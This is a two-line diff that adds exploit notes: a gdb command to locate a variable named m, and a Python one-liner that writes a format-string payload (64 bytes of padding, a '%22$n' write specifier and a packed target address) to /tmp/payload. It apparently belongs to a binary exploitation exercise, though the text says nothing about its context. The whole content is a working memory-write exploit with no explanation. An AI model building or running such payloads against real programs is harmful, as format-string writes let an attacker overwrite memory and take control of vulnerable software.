@@ -1,0 +1,2 @@
+gdb -> info var m
+python -c 'import struct; import sys; sys.stdout.write("a"*64 + "%22$n" + "AAA" + struct.pack("<I", 0x0804988c));' > /tmp/payload
